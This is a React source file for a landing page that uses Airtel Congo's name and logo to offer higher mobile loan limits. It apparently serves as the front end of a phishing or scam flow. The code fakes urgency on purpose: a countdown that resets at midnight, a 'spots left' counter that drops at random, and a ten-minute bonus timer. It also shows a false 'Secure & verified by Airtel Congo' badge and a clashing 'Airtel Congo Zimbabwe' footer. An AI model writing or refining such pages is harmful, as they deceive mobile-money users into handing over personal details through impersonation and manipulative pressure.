import React, { useState, useEffect } from "react";
import {
    pageStyle,
    headerStyle,
    logoStyle,
    menuButtonStyle,
    contentStyle,
    cardStyle,
    footerStyle,
    buttonStyle,
} from "../styles/sharedStyles";
import { LandingPageProps } from "../types";

function LandingPage({ onApply }: LandingPageProps) {
    // Countdown timer - expires at midnight
    const [timeLeft, setTimeLeft] = useState({ hours: 0, minutes: 0, seconds: 0 });

    // Limited spots counter
    const [spotsLeft, setSpotsLeft] = useState(47);

    // Bonus timer - 10 minutes
    const [bonusTime, setBonusTime] = useState(600); // 10 mins in seconds

    useEffect(() => {
        // Calculate time until midnight
        const calculateTimeLeft = () => {
            const now = new Date();
            const midnight = new Date();
            midnight.setHours(24, 0, 0, 0);
            const diff = midnight.getTime() - now.getTime();

            return {
                hours: Math.floor((diff / (1000 * 60 * 60)) % 24),
                minutes: Math.floor((diff / (1000 * 60)) % 60),
                seconds: Math.floor((diff / 1000) % 60),
            };
        };

        setTimeLeft(calculateTimeLeft());

        const timer = setInterval(() => {
            setTimeLeft(calculateTimeLeft());
        }, 1000);

        return () => clearInterval(timer);
    }, []);

    // Spots counter - decreases randomly
    useEffect(() => {
        const spotTimer = setInterval(() => {
            setSpotsLeft(prev => {
                if (prev <= 5) return prev;
                // Random chance to decrease
                if (Math.random() > 0.7) {
                    return prev - 1;
                }
                return prev;
            });
        }, 8000); // Check every 8 seconds

        return () => clearInterval(spotTimer);
    }, []);

    // Bonus countdown
    useEffect(() => {
        const bonusTimer = setInterval(() => {
            setBonusTime(prev => (prev > 0 ? prev - 1 : 0));
        }, 1000);

        return () => clearInterval(bonusTimer);
    }, []);

    const formatBonusTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins}:${secs.toString().padStart(2, '0')}`;
    };

    return (
        <div style={pageStyle}>
            <div style={headerStyle}>
                <img src="/Airtel Congo.svg" alt="Airtel Congo" style={logoStyle} />
                <button
                    style={menuButtonStyle}
                    onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
                    onMouseOut={(e) => (e.currentTarget.style.background = "none")}
                >
                    ☰
                </button>
            </div>

            <div style={contentStyle}>
                <div style={{ ...cardStyle, maxWidth: "580px" }}>

                    {/* Countdown Timer Banner */}
                    <div
                        style={{
                            background: "linear-gradient(135deg, #ff6b6b 0%, #ee5a5a 100%)",
                            color: "white",
                            padding: "12px 16px",
                            borderRadius: "12px",
                            marginBottom: "20px",
                            textAlign: "center",
                        }}
                    >
                        <div style={{ fontSize: "12px", fontWeight: "600", marginBottom: "4px", textTransform: "uppercase" }}>
                            ⏰ Offer Expires In
                        </div>
                        <div style={{ fontSize: "28px", fontWeight: "900", letterSpacing: "2px" }}>
                            {String(timeLeft.hours).padStart(2, '0')}:{String(timeLeft.minutes).padStart(2, '0')}:{String(timeLeft.seconds).padStart(2, '0')}
                        </div>
                    </div>

                    {/* Hero Badge */}
                    <div
                        style={{
                            background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
                            color: "white",
                            padding: "8px 16px",
                            borderRadius: "20px",
                            fontSize: "12px",
                            fontWeight: "700",
                            display: "inline-block",
                            marginBottom: "20px",
                            textTransform: "uppercase",
                            letterSpacing: "0.5px",
                        }}
                    >
                        🎄 December Holiday Special
                    </div>

                    <h1
                        style={{
                            textAlign: "center",
                            fontSize: "32px",
                            fontWeight: "800",
                            marginBottom: "16px",
                            color: "#1a1a1a",
                            letterSpacing: "-0.5px",
                            lineHeight: "1.2",
                        }}
                    >
                        Increase Your Airtel Congo Loan Limit
                    </h1>

                    <p
                        style={{
                            textAlign: "center",
                            color: "#666",
                            marginBottom: "24px",
                            fontSize: "16px",
                            lineHeight: "1.6",
                        }}
                    >
                        Our engineers have unlocked <strong style={{ color: "#667eea" }}>higher limits</strong> for qualifying Airtel Congo users.
                    </p>

                    {/* Limited Spots Alert */}
                    <div
                        style={{
                            background: "#fff3cd",
                            border: "1px solid #ffc107",
                            borderRadius: "10px",
                            padding: "12px 16px",
                            marginBottom: "20px",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            gap: "8px",
                        }}
                    >
                        <span style={{ fontSize: "18px" }}>🔥</span>
                        <span style={{ color: "#856404", fontWeight: "700", fontSize: "14px" }}>
                            Only {spotsLeft} spots left today!
                        </span>
                    </div>

                    {/* Bonus Timer */}
                    {bonusTime > 0 && (
                        <div
                            style={{
                                background: "linear-gradient(135deg, #10b981 0%, #059669 100%)",
                                color: "white",
                                borderRadius: "10px",
                                padding: "14px 16px",
                                marginBottom: "24px",
                                textAlign: "center",
                            }}
                        >
                            <div style={{ fontSize: "13px", fontWeight: "600", marginBottom: "4px" }}>
                                ⚡ Complete in next {formatBonusTime(bonusTime)} = Extra $5 Bonus!
                            </div>
                        </div>
                    )}

                    {/* Value Proposition Box */}
                    <div
                        style={{
                            background: "linear-gradient(135deg, #f5f7fa 0%, #e8eaf6 100%)",
                            padding: "24px",
                            borderRadius: "16px",
                            marginBottom: "24px",
                            border: "2px solid #c5cae9",
                        }}
                    >
                        <div
                            style={{
                                display: "grid",
                                gridTemplateColumns: "1fr 1fr",
                                gap: "16px",
                                textAlign: "center",
                            }}
                        >
                            <div
                                style={{
                                    background: "white",
                                    padding: "16px",
                                    borderRadius: "12px",
                                    boxShadow: "0 2px 8px rgba(0,0,0,0.05)",
                                }}
                            >
                                <div style={{ fontSize: "24px", marginBottom: "8px" }}>⚡</div>
                                <div style={{ fontSize: "13px", fontWeight: "700", color: "#333" }}>
                                    Instant Check
                                </div>
                                <div style={{ fontSize: "11px", color: "#777" }}>30 seconds</div>
                            </div>
                            <div
                                style={{
                                    background: "white",
                                    padding: "16px",
                                    borderRadius: "12px",
                                    boxShadow: "0 2px 8px rgba(0,0,0,0.05)",
                                }}
                            >
                                <div style={{ fontSize: "24px", marginBottom: "8px" }}>📋</div>
                                <div style={{ fontSize: "13px", fontWeight: "700", color: "#333" }}>
                                    No Paperwork
                                </div>
                                <div style={{ fontSize: "11px", color: "#777" }}>Just your phone</div>
                            </div>
                        </div>
                    </div>

                    <button
                        onClick={onApply}
                        style={{
                            ...buttonStyle,
                            background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
                            fontSize: "18px",
                            padding: "18px 32px",
                        }}
                        onMouseOver={(e) => {
                            e.currentTarget.style.transform = "translateY(-2px)";
                            e.currentTarget.style.boxShadow = "0 8px 24px rgba(102, 126, 234, 0.4)";
                        }}
                        onMouseOut={(e) => {
                            e.currentTarget.style.transform = "translateY(0)";
                            e.currentTarget.style.boxShadow = "0 4px 12px rgba(102, 126, 234, 0.3)";
                        }}
                    >
                        CHECK MY LIMIT →
                    </button>

                    {/* Trust indicators */}
                    <div
                        style={{
                            marginTop: "24px",
                            paddingTop: "20px",
                            borderTop: "1px solid #eee",
                            display: "flex",
                            justifyContent: "center",
                            alignItems: "center",
                            gap: "8px",
                            color: "#888",
                            fontSize: "13px",
                        }}
                    >
                        <span>🔒</span>
                        <span>Secure & verified by Airtel Congo</span>
                    </div>
                </div>
            </div>

            <div style={footerStyle}>© 2025 Airtel Congo Zimbabwe</div>
        </div>
    );
}

export default LandingPage;
